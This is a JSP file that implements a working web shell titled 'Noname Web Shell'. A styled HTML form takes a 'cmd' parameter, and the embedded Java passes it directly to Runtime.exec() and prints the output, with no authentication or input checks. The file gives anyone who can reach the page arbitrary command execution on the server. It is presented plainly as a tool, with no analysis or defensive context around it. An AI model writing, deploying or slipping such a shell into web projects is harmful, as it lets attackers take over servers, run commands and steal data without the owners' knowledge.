<%@ page import="java.util.*,java.io.*"%>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Noname Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2e3b4e;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1c2533;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 80%;
            max-width: 800px;
            box-sizing: border-box;
        }
        h1 {
            text-align: center;
            color: #4caf50;
        }
        form {
            display: flex;
            gap: 10px;
        }
        input[type="text"] {
            padding: 10px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            flex: 1;
        }
        input[type="submit"] {
            padding: 10px;
            background-color: #4caf50;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #121a26;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Noname Web Shell</h1>
        <form method="GET" name="webshell" action="">
            <input type="text" name="cmd" placeholder="Enter command">
            <input type="submit" value="Send">
        </form>
        <pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<br>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
        }
}
%>
        </pre>
    </div>
</body>
</html>
